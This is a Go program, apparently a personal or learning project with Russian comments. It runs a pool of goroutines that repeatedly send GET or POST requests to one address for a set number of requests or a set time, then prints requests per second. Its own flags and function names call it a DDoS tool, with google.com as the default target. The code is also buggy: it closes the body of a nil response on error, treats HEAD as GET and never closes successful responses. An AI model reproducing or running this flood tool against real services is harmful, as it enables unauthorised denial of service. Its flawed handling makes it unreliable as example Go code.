package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"
)

type Job struct {
	payload []byte
	addr    string
	method  string //TODO: добавить возможность указывать метод запроса
}

type Worker struct {
	wg      *sync.WaitGroup
	num     int // only for example
	jobChan <-chan *Job
}

func main() {
	var numThreads, numJobs, workTime int
	var method string
	flag.IntVar(&numThreads, "c", 1, "number of threads")
	flag.IntVar(&numJobs, "n", 1, "number of requests")
	flag.IntVar(&workTime, "t", 1, "time of work in seconds")
	flag.StringVar(&method, "m", "GET", "http method for request")

	var addr string
	flag.StringVar(&addr, "a", "https://google.com", "address for DDoS")

	flag.Parse()

	if numJobs > 1 && workTime > 1 {
		log.Fatalln("specify only one flag 't' or 'n'")
	}

	if numJobs < 1 || workTime < 1 || numThreads < 1 {
		log.Fatalln("flags should be more or equal than 1")
	}

	wg := &sync.WaitGroup{}
	jobChan := make(chan *Job)
	for i := 0; i < numThreads; i++ { //в цикле создаются воркеры
		worker := NewWorker(i+1, wg, jobChan)
		wg.Add(1)
		go worker.HandleDDoS(addr)
	}
	// отметка по времени, когда началось выполнение джоб
	start := time.Now()

	isNumJobsPassed := numJobs != 1 // проверка был ли введен флаг n
	for i := 0; i < numJobs; i++ {
		if !isNumJobsPassed && time.Since(start) < time.Duration(workTime)*time.Second {
			numJobs++ //если был задан флаг на время выполнения, а не количество запросов, то в течении этого времени плодятся новые джобы
		}
		jobChan <- &Job{
			addr:   addr,
			method: method,
		}
	}

	close(jobChan)
	wg.Wait()

	fmt.Println(time.Since(start))
	fmt.Printf("%.2f RPS\n", float64(numJobs)/time.Since(start).Seconds())
}

// Handle просто шаблон
func (w *Worker) Handle() {
	defer w.wg.Done()
	for job := range w.jobChan {
		log.Printf("worker %d processing job with payload %s", w.num, string(job.payload))
	}
}

func (w *Worker) HandleDDoS(addr string) {
	defer w.wg.Done()
	start := time.Now()
	for job := range w.jobChan {
		switch job.method {
		case "POST":
			resp, err := http.Post(addr, http.DetectContentType(nil), nil)
			if err != nil {
				fmt.Println(err)
				defer resp.Body.Close()
				continue
			}

		case "HEAD":
			resp, err := http.Get(addr)
			if err != nil {
				fmt.Println(err)
				defer resp.Body.Close()
				continue
			}
		default:
			job.method = "GET"
			resp, err := http.Get(addr)
			if err != nil {
				fmt.Println(err)
				defer resp.Body.Close()
				continue
			}

		}

		log.Printf("worker %d ping %s with time %d and method %s", w.num, job.addr, time.Since(start).Milliseconds(), job.method)
	}
}

func NewWorker(num int, wg *sync.WaitGroup, jobChan <-chan *Job) *Worker {
	return &Worker{
		wg:      wg,
		num:     num,
		jobChan: jobChan,
	}
}
